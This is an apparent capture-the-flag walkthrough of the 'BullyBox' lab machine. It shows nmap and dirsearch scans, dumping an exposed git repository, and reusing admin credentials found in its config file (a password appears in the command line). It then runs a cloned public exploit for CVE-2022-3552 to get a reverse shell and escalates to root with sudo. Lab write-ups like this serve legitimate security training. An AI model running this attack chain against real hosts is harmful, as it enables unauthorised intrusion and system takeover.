---
icon: ubuntu
---

# BullyBox - Intermediate

## Gaining Access

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.131.27 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 18:41 EDT
Nmap scan report for 192.168.131.27
Host is up (0.091s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   34.81 ms  192.168.45.1
2   34.76 ms  192.168.45.254
3   295.77 ms 192.168.251.1
4   296.06 ms 192.168.131.27
```

### HTTP Port 80 TCP

<figure><img src="../../.gitbook/assets/image (2012).png" alt=""><figcaption></figcaption></figure>

Visiting the webpage we get a redirect, I am going to add it to my /etc/hosts file

```
192.168.131.27 	bullybox.local
```

<figure><img src="../../.gitbook/assets/image (2013).png" alt=""><figcaption></figcaption></figure>

### Directory Busting

```
dirsearch -u http://bullybox.local/
```

<figure><img src="../../.gitbook/assets/image (2014).png" alt=""><figcaption></figcaption></figure>

Reveals a git repo, I am going to dump the repo using [**gitdumper**](https://github.com/arthaud/git-dumper)

```
python ~/tools/git-dumper/git_dumper.py http://bullybox.local/.git .
```

<figure><img src="../../.gitbook/assets/image (2015).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2016).png" alt=""><figcaption></figcaption></figure>

the config file has  a set of database credentials for bullybox, and the admin path. I am going to visit the admin path and try the credentials!

<figure><img src="../../.gitbook/assets/image (2018).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2001).png" alt=""><figcaption></figcaption></figure>

I found a version, I am going to look for an exploit. But first I am going to test the credentials I have.

<figure><img src="../../.gitbook/assets/image (2004).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2005).png" alt=""><figcaption></figcaption></figure>

The credentials work! I am going to look for an exploit now.

### BoxBilling 4.22.1.5 RCE

<figure><img src="../../.gitbook/assets/image (2003).png" alt=""><figcaption></figcaption></figure>

I am going to clone that [**repo**](https://github.com/0xk4b1r/CVE-2022-3552) and take a look at the exploit.

```
git clone https://github.com/0xk4b1r/CVE-2022-3552.git
```

<figure><img src="../../.gitbook/assets/image (2007).png" alt=""><figcaption></figcaption></figure>

Before we try to run the exploit we need to change the ip and port to our attacking machine, and then setup a listener on our desired port.

```
python3 CVE-2022-3552.py -d http://bullybox.local -u admin@bullybox.local -p Playing-Unstylish7-Provided
```

<figure><img src="../../.gitbook/assets/image (2008).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2009).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

<figure><img src="../../.gitbook/assets/image (2010).png" alt=""><figcaption></figcaption></figure>

Privilege escalation was very simple, because yuki was allowed to run everything as root, so all we had to do is run /bin/bash as root

```
sudo /bin/bash
```
